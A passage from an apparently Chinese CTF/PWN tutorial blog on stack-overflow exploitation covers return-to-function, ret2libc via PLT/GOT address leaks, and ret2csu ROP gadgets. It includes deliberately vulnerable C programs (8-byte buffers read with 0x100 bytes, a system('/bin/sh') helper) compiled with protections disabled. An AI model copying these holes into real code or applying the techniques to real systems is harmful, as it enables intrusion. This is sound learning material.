+<p>ret指定函数，带形参，x86，32位</p>
+</li>
+<li>
+<p>gcc编译<code> </code></p>
+</li>
+<li>
+<p>程序源码</p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">        system(cmd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">        <span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ebp             -&gt;      0xdeadbeef</span></span><br><span class="line"><span class="comment">eip(r)  -&gt;      func_addr</span></span><br><span class="line"><span class="comment">                -&gt;  0xdeadbeef</span></span><br><span class="line"><span class="comment">                -&gt;  argc1</span></span><br><span class="line"><span class="comment">                -&gt;      argc2</span></span><br><span class="line"><span class="comment">                -&gt;      argc3</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="重点分析"><a class="markdownIt-Anchor" href="#重点分析"></a> 重点分析</h3>
+<ul>
+<li>在正常调用函数的时候都会有call</li>
+<li>而call的指令有
+<ul>
+<li>push</li>
+<li>jmp</li>
+</ul>
+</li>
+<li>而在非法调用函数的时候，是没有call指令的。直接用ret指令跳到非法调用的函数中。但是缺少了把rip寄存器压入栈中。这就会导致这种情况的出现</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240323210941448.png" alt="image-20240323210941448"></p>
+<p><strong>原本ebp下面一行应该是返回地址，但是却变成了参数的地址</strong></p>
+<p><strong>所以在放我们想要返回非法函数的地址时，需要先将执行完func之后的返回地址压入栈中</strong></p>
+<h2 id="作业3"><a class="markdownIt-Anchor" href="#作业3"></a> 作业3</h2>
+<ul>
+<li>将例题2源码中，read函数的读取字符数缩小</li>
+<li>x86,32位编译</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">        system(cmd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x18</span>);</span><br><span class="line">        <span class="comment">//printf(b);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="例题3"><a class="markdownIt-Anchor" href="#例题3"></a> 例题3</h2>
+<ul>
+<li>ret指定函数，代参数，64位传参模式</li>
+</ul>
+<h3 id="测试64位函数调用"><a class="markdownIt-Anchor" href="#测试64位函数调用"></a> 测试64位函数调用</h3>
+<ul>
+<li>64位函数调用模式测试代码</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> argc1=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add_test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b ,<span class="type">int</span> c)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> argc2=<span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> argc3=<span class="number">30</span>;</span><br><span class="line">    add_test(argc1,argc2,argc3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>发现传参不再使用pop</li>
+<li>还有在传递全局变量的时候是用段寄存器读取值</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240324105735970.png" alt="image-20240324105735970"></p>
+<ul>
+<li>再对程序进行修改</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> argc1=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add_test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b ,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f, <span class="type">int</span> g,<span class="type">int</span> h)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c+b+c+d+e+f+g+h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> argc2=<span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> argc3=<span class="number">30</span>;</span><br><span class="line">        <span class="type">int</span> argc4=<span class="number">40</span>;</span><br><span class="line">        <span class="type">int</span> argc5=<span class="number">40</span>;</span><br><span class="line">        <span class="type">int</span> argc6=<span class="number">40</span>;</span><br><span class="line">        <span class="type">int</span> argc7=<span class="number">40</span>;</span><br><span class="line">        <span class="type">int</span> argc8=<span class="number">40</span>;</span><br><span class="line">    add_test(argc1,argc2,argc3,argc4,argc5,argc6,argc7,argc8);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>使用ida反汇编会发现</p>
+</li>
+<li>
+<p>当参数太多，寄存器不够用的时候。才会把一些参数通过压栈的方式进行传参。</p>
+</li>
+<li>
+<p>而压栈是通过edi,rdi寄存器进行的</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     edi, [rbp+var_4]</span><br><span class="line">push    rdi</span><br><span class="line">mov     edi, [rbp+var_8]</span><br><span class="line">push    rdi</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240324110311663.png" alt="image-20240324110311663"></p>
+<h1 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc"></a> ret2libc</h1>
+<ul>
+<li>
+<p>查看libc的网站：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/latest/source">Glibc source code (glibc-2.39.9000) - Bootlin</a></p>
+</li>
+<li>
+<p>ret2text中，通过栈溢出修改返回地址，可以调用到system函数，而调用函数的地址通常是可以通过IDA静态编译得到</p>
+</li>
+<li>
+<p>而ret2libc中，编写的程序没有关于调用system的函数。使用IDA静态反汇编得不到system函数的地址。这时通常需要返回到libc库中的system的地址得到shellcode。</p>
+</li>
+<li>
+<p>三个问题：</p>
+<ul>
+<li>程序中没有system函数就一定没有system函数吗？</li>
+<li>怎么计算libc的基地址</li>
+<li>怎么泄露libc里面存在的某个函数的地址</li>
+</ul>
+</li>
+</ul>
+<h2 id="前置知识-2"><a class="markdownIt-Anchor" href="#前置知识-2"></a> 前置知识</h2>
+<ul>
+<li>在了解ret2libc的原理之前，先要有一些前置知识。</li>
+</ul>
+<h3 id="链接"><a class="markdownIt-Anchor" href="#链接"></a> 链接</h3>
+<ul>
+<li>在gcc入门里面有介绍</li>
+</ul>
+<p><a href="https://iyheart.github.io/2024/03/05/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%85%A5%E9%97%A8/">PWN入门 | iyheart的博客</a></p>
+<h3 id="地址"><a class="markdownIt-Anchor" href="#地址"></a> 地址</h3>
+<ul>
+<li>
+<p>绝对地址</p>
+</li>
+<li>
+<p>相对地址</p>
+</li>
+<li>
+<p>偏移量</p>
+</li>
+</ul>
+<h4 id="绝对地址"><a class="markdownIt-Anchor" href="#绝对地址"></a> 绝对地址</h4>
+<ul>
+<li>在以内存起点为0，程序在内存中的地址就是绝对地址，下图中所示的就是绝对地址</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330102204045.png" alt="image-20240330102204045"></p>
+<p><strong>基地址</strong>：程序头在内存中的地址</p>
+<h4 id="相对地址"><a class="markdownIt-Anchor" href="#相对地址"></a> 相对地址</h4>
+<ul>
+<li>相对地址就是一个指令或一个函数等在程序段中的地址，通常把程序开头的地址看作是<code>0x000000</code>，相对该程序开头的距离多少</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330102740218.png" alt="image-20240330102740218"></p>
+<h4 id="偏移量"><a class="markdownIt-Anchor" href="#偏移量"></a> 偏移量</h4>
+<ul>
+<li>在栈溢出偏移量就是，要输入多少个字符，才能溢出到返回地址。</li>
+<li>而在程序中的偏移量，可以简单的理解为某一段在程序中的相对地址</li>
+</ul>
+<h4 id="计算libc库中某个函数的绝对地址"><a class="markdownIt-Anchor" href="#计算libc库中某个函数的绝对地址"></a> 计算libc库中某个函数的绝对地址</h4>
+<ul>
+<li>在已知，libc库中<strong>puts函数的绝对地址、相对地址</strong>，还有<strong>system函数的相对地址</strong>，怎么计算出system函数的绝对地址</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330104426860.png" alt="image-20240330104426860"></p>
+<h3 id="plt表和got表"><a class="markdownIt-Anchor" href="#plt表和got表"></a> plt表和got表</h3>
+<ul>
+<li>
+<p><strong>PLT</strong>（Procedure Linkage Table）程序链接表</p>
+</li>
+<li>
+<p><strong>GOT</strong> (Global Offset Table)全局偏移表</p>
+</li>
+<li>
+<p>关于俩个表的使用及其调用过程</p>
+</li>
+</ul>
+<p><strong>在调用函数的过程中，如果没有开启保护，那么就会进行如下操作</strong></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330122059662.png" alt="image-20240330122059662"></p>
+<h2 id="例题1-2"><a class="markdownIt-Anchor" href="#例题1-2"></a> 例题1</h2>
+<ul>
+<li>示例程序</li>
+<li>gcc编译指令<code>gcc question_5.c -fno-stack-protector -no-pie -o question_5_x64 </code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;input:&quot;</span>,<span class="number">6</span>);<span class="comment">//2,3,4 fd=open(&#x27;./a&#x27;);puts</span></span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;byebye&quot;</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3>
+<ul>
+<li>先查看一下该可执行文件的保护情况</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330093000009.png" alt="image-20240330093000009"></p>
+<h3 id="动调"><a class="markdownIt-Anchor" href="#动调"></a> 动调</h3>
+<ul>
+<li>进行动态调试，步入到dofunc函数里面中的<code> call read@plt</code>指令中</li>
+<li>会发现read函数将用户输入存储在栈中的位置，输入8个字节就到rbp所指向的位置，再输入8个字节就可以覆盖返回地址了</li>
+<li>在原先的<code>ret2text</code>中，接下来要做的就是覆盖返回地址到后门函数中，但是现在程序中没有后门函数</li>
+<li>这里的动调会用上新的指令<code> watch *0x404018</code>设置内存断点</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330093334665.png" alt="image-20240330093334665"></p>
+<ul>
+<li>由于源码中没有设置后门函数，我们就需要想办法找到<code> /bin/sh</code>和<code> system</code>函数的地址，接下来就开始寻找。使用gdb指令<code> search '/bin/sh'</code>和<code> p &amp;system</code></li>
+<li>寻找后会发现，在libc.so.6中存在<code> /bin/sh</code></li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330094535942.png" alt="image-20240330094535942"></p>
+<h3 id="分析write函数"><a class="markdownIt-Anchor" href="#分析write函数"></a> 分析write函数</h3>
+<ul>
+<li>设置断点到<code>call write</code>指令，运行到该位置后，<code> si</code>进入到write函数的内部，发现是在一个名为<code>write@plt</code>函数中</li>
+<li>下图可知，接下来write函数会跳转到<code>0x401030</code>处</li>
+<li>而跳转后，接下去会继续跳转，跳转到<code>0x401020</code>处</li>
+<li>之后又会跳转到<code>0x7ffff7fd8d30</code>处，一个名为 &lt;_dl_runtime_resolve_xsavec&gt;的函数</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330095057134.png" alt="image-20240330095057134"></p>
+<ul>
+<li>ni下去，会发现程序会跳转到真正的write函数的内部</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330095823476.png" alt="image-20240330095823476"></p>
+<ul>
+<li>si步入进去，会发现，write函数里面会有调用<code>syscall</code></li>
+<li>之后就会输出<code>input:</code>这个字串了</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330100041636.png" alt="image-20240330100041636"></p>
+<ul>
+<li>使用<code>vmmap</code>指令查看write函数的地址</li>
+<li>会发现write函数是在</li>
+</ul>
+<p><code>  0x7ffff7db3000     0x7ffff7f48000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6</code>这个位置里面</p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330100240102.png" alt="image-20240330100240102"></p>
+<p><strong><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330100401612.png" alt="image-20240330100401612"></strong></p>
+<ul>
+<li>这涉及到内存的一些知识</li>
+<li>一般来说<code>write read printf puts </code>等函数都会放在红色区域，而现在的重点就放在<code>libc.so.6</code>这个库中，前面查看system函数的地址也是放在这里的</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330100816896.png" alt="image-20240330100816896"></p>
+<ul>
+<li>对system进行反汇编，可以看到system函数的汇编代码，但是system函数里面不存在<code>/bin/sh</code>参数</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330101233303.png" alt="image-20240330101233303"></p>
+<p><strong>总的来说</strong>：libc函数里面存在着一些函数比如<code> read printf puts write</code>甚至是重要的<code> system</code>还有<code> /bin/sh</code>字符串</p>
+<h3 id="分析程序进入write函数的过程"><a class="markdownIt-Anchor" href="#分析程序进入write函数的过程"></a> 分析程序进入write函数的过程</h3>
+<ul>
+<li>先步入到dofunc中要调用write函数的指令中，不入进去</li>
+<li>在这个位置可以先查看一下got表，会发现got表还没有写write函数的地址，而里面的值存储的却是plt表的地址</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330105157652.png" alt="image-20240330105157652"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330110656699.png" alt="image-20240330110656699"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330111322730.png" alt="image-20240330111322730"></p>
+<ul>
+<li>从该地址开始，反汇编，然后会发现进入plt表，而plt表在函数又会跳转到got表中</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330105216921.png" alt="image-20240330105216921"></p>
+<ul>
+<li>这里使用<code> watch *404018指令</code>观察got表的值是否被修改，会发现程序结束了在plt表和got表之间反复横跳之后，got里面的值会被改变</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330111817788.png" alt="image-20240330111817788"></p>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330111847796.png" alt="image-20240330111847796"></p>
+<ul>
+<li>说明在下图指令中的上一个指令got的值就被改变了</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330111941598.png" alt="image-20240330111941598"></p>
+<ul>
+<li>但是当调用完第一次write，输出<code> input:</code>后，再调用第二次write输出<code>bye bye</code>的时候就不会出现第一次调用时那么一大堆的程序</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330110201397.png" alt="image-20240330110201397"></p>
+<h3 id="漏洞思路"><a class="markdownIt-Anchor" href="#漏洞思路"></a> 漏洞思路</h3>
+<ul>
+<li>通过栈溢出和布置ROP链泄露got表中，write的地址，将write的值给输出到显示屏上，然后计算system和<code> /bin/sh</code>的地址，从而获取权限</li>
+</ul>
+<h2 id="例题2-2"><a class="markdownIt-Anchor" href="#例题2-2"></a> 例题2</h2>
+<ul>
+<li>
+<p>32位的程序，函数调用的规则不同，不用构造rop链，32位的libc库自己去寻找</p>
+</li>
+<li>
+<p>gcc编译指令<code> gcc question_5.c -m32 -fno-stack-protector -no-pie -o question_5_x86</code></p>
+</li>
+<li>
+<p>程序源码</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> dofunc()&#123;</span><br><span class="line">    char b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;input:&quot;</span>,<span class="number">6</span>);//<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> fd=<span class="built_in">open</span>(<span class="string">&#x27;./a&#x27;</span>);puts</span><br><span class="line">        read(<span class="number">0</span>,b,<span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>,<span class="string">&quot;byebye&quot;</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">    dofunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="例题3-2"><a class="markdownIt-Anchor" href="#例题3-2"></a> 例题3</h2>
+<ul>
+<li>当题目没有给libc.so文件应该怎么办</li>
+</ul>
+<p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/707">BJDCTF 2020]babyrop | NSSCTF</a></p>
+<h1 id="ret2csu"><a class="markdownIt-Anchor" href="#ret2csu"></a> ret2csu</h1>
+<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2>
+<ul>
+<li>
+<p>在使用ida的时候注意到，有函数的名称叫做<code> libc_csu_init</code>和<code> libc_csu_fini</code></p>
+</li>
+<li>
+<p>这个函数是gcc在编译的过程中生成的，只要是正常的程序编译完都会有该函数，不同版本的gcc生成的指令有所差别</p>
+</li>
+</ul>
+<p><img src="/2024/03/22/PWN%E7%B3%BB%E5%88%97blog/5PWN-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/image-20240330195636414.png" alt="image-20240330195636414"></p>
+<ul>
+<li>
+<p>而<code>libc_csu_init</code>函数中结尾有个典型的特点，连续<code>pop</code>,并且有调用函数，还能控制3个寄存器（这3个寄存器都涉及到函数的参数传递），这是一段非常好的构造ROP链的代码</p>
+</li>
+<li>
+<p>红色框下方的汇编代码,只要不执行跳转，那么就可以走下去，利用pop传参，这就需要ROP链既要控制rbp，也要控制rbx</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add rbx,1</span><br><span class="line">cmp rbp,rbx</span><br><span class="line">jnz short loc_a011D8</span><br><span class="line"># 要使得跳转不发生就要有</span><br><span class="line">rbp = rbx + 1</span><br><span class="line"></span><br><span class="line">rbx需要等于0，这样r15才是函数的地址 也可以使用加法去拼凑函数地址</span><br><span class="line"></span><br><span class="line">要控制r15</span><br><span class="line"></span><br><span class="line">rdi 是由 r12 来控制</span><br><span class="line">rsi 是由 r13 来控制</span><br><span class="line">rdx 是由 r14 来控制</span><br><span class="line"></span><br><span class="line"># 所以只要控制</span><br><span class="line">rbp rbx r12 r13 r14 r15</span><br><span class="line"># 这六个参数就可以进行一些操作</span><br><span class="line"># 而这几个寄存器在下方连续pop处都有用到</span><br><span class="line"># 完成一次就相当于完成了一次call func，而且该func的前三个参数我们是可以控制的</span><br></pre></td></tr></table></figure>
+<ul>
+<li>由此可以得到思路先ret到连续pop处，在ret到红框处，继续pop参数，</li>
+</ul>
